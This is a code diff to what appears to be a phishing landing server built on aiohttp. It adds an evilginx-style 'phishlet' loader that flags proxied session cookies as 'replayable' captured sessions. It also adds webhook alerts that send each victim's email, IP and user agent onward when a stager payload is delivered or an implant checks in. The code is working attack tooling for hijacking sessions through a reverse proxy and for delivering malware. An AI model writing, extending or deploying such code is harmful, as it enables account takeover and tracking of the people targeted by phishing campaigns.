@@ -8,6 +8,8 @@ import hmac
 import json
 import logging
 import os
+import time
+from pathlib import Path
 from typing import Any
 from urllib.parse import urlsplit
 
@@ -80,6 +82,27 @@ def settings_for(store: Store, campaign: dict[str, Any]) -> dict[str, Any]:
     return merged
 
 
+def _load_phishlet(path: str) -> dict[str, Any]:
+    """evilginx-lite session spec: {"target_host": "...", "session_cookies":
+    ["sid", ...]} — cookie names that mark a captured proxy session as
+    replayable. Malformed file -> hard fail; the operator sees it, not the
+    victim."""
+    with Path(path).open(encoding="utf-8") as fh:
+        spec = json.load(fh)
+    if not isinstance(spec, dict):
+        raise ValueError("phishlet must be a json object")
+    names = spec.get("session_cookies", [])
+    if not isinstance(names, list) or not all(isinstance(n, str) for n in names):
+        raise ValueError("phishlet session_cookies must be a list of strings")
+    host = str(spec.get("target_host", ""))
+    if host and "://" in host:
+        host = urlsplit(host).hostname or ""
+    return {
+        "target_host": host.lower(),
+        "session_cookies": frozenset(n for n in names if n),
+    }
+
+
 def normalize_token(raw: str) -> str:
     """`tok`, `tok.gif`, `tok.hta` all address the same target."""
     return raw.split(".")[0]
@@ -134,6 +157,7 @@ class LandingServer:
         default_kind: str = "",
         filter_scanners: bool = False,
         upstream: str = "",
+        phishlet: str = "",
     ) -> None:
         from aiohttp import web
 
@@ -153,6 +177,9 @@ class LandingServer:
             if parts.scheme not in ("http", "https") or not parts.hostname:
                 raise ValueError(f"bad --upstream URL: {upstream!r}")
             self._upstream = (parts.scheme, parts.netloc)
+        self._phishlet: dict[str, Any] = {}
+        if phishlet:
+            self._phishlet = _load_phishlet(phishlet)
 
     # ─── url builders ───
     def _loopback(self) -> bool:
@@ -194,6 +221,36 @@ class LandingServer:
     ) -> str:
         kind = target.get("meta_kind") or settings.get("kind", "psenc")
         return Stager.command(kind, f"{base}/s/{kind}/{target['token']}")
+
+    async def _notify_webhooks(self, payload: dict[str, Any]) -> None:
+        """Fan a hit out to every registered webhook — each post bounded to
+        5 s and error-swallowed: a dead channel must not slow a victim
+        response round-trip."""
+        from .http import get_client
+
+        urls = await self._store(self.store.list_webhooks)
+        if not urls:
+            return
+        body = json.dumps(
+            {"type": "hit", **payload, "at": time.time()}, ensure_ascii=False
+        ).encode("utf-8")
+        try:
+            client = get_client()
+            sess = await client.session()
+            timeout = getattr(client, "_timeout", None)
+            for url in urls[:16]:
+                try:
+                    kwargs: dict[str, Any] = {"data": body}
+                    if timeout is not None:
+                        kwargs["timeout"] = min(timeout, 5.0)
+                    else:
+                        kwargs["timeout"] = 5.0
+                    async with sess.post(url, **kwargs) as resp:
+                        await resp.read()
+                except Exception as exc:  # noqa: BLE001
+                    LOG.warning("webhook %s: %s", url, exc)
+        except Exception as exc:  # noqa: BLE001
+            LOG.warning("webhook client: %s", exc)
 
     def _target_meta(self, target: dict[str, Any]) -> dict[str, Any]:
         try:
@@ -305,6 +362,17 @@ class LandingServer:
             ua=request.headers.get("User-Agent", ""),
         )
         self._advance(target, "delivered")
+        asyncio.ensure_future(
+            self._notify_webhooks(
+                {
+                    "kind": f"stager:{kind}",
+                    "token": token,
+                    "campaign": target["campaign_id"],
+                    "email": target.get("email", ""),
+                    "ip": request.remote or "",
+                }
+            )
+        )
         return web.Response(
             text=body,
             content_type=content_type.split(";")[0],
@@ -345,6 +413,21 @@ class LandingServer:
         )
         if stage in ("exec", "run"):
             self._advance(target, "executed")
+        # webhook fan-out must not delay the 204 the implant is waiting on
+        schedule = getattr(asyncio, "create_task", None)  # aiohttp loop guard
+        if schedule is not None:
+            schedule(
+                self._notify_webhooks(
+                    {
+                        "kind": f"hit:{stage}",
+                        "token": token,
+                        "campaign": target["campaign_id"],
+                        "email": target.get("email", ""),
+                        "ip": request.remote or "",
+                        "ua": (request.headers.get("User-Agent", "") or "")[:200],
+                    }
+                )
+            )
         return self.web.Response(status=204)
 
     async def ext_ingest(self, request: Any) -> Any:
@@ -560,18 +643,35 @@ class LandingServer:
                     )
                     body = html.encode("utf-8")
                 if resp.cookies:
+                    cookies = {
+                        k: morsel.value[:200]
+                        for k, morsel in resp.cookies.items()
+                    }
+                    session_names = frozenset(cookies) & self._phishlet.get(
+                        "session_cookies", frozenset()
+                    )
                     await self._store(
                         self.store.log_event,
                         "",
                         "",
-                        "proxy:cookie",
+                        "proxy:session"
+                        if session_names
+                        else "proxy:cookie",
                         json.dumps(
                             {
                                 "host": netloc,
-                                "cookies": {
-                                    k: morsel.value[:200]
-                                    for k, morsel in resp.cookies.items()
-                                },
+                                "cookies": cookies,
+                                **(
+                                    {
+                                        "phishlet": self._phishlet.get(
+                                            "target_host", ""
+                                        ),
+                                        "session_names": sorted(session_names),
+                                        "replayable": True,
+                                    }
+                                    if session_names
+                                    else {}
+                                ),
                             },
                             ensure_ascii=False,
                         )[:1600],
